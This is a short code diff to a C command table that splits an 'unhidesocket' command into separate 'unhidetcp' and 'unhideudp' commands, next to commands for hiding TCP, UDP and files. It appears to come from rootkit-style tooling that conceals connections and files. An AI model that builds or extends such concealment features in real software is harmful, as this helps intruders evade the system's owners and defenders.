@@ -19,7 +19,8 @@ void init_commands(void) {
 
     add_command("hidetcp", hideTCP, 1);
     add_command("hideudp", hideUDP, 1);
-    add_command("unhidesocket", unhide_socket, 0);
+    add_command("unhidetcp", unhideTCP, 1);
+    add_command("unhideudp", unhideUDP, 1);
 
     add_command("hidefiles", hide_files, 0);
     add_command("unhidefiles", unhide_files, 0);
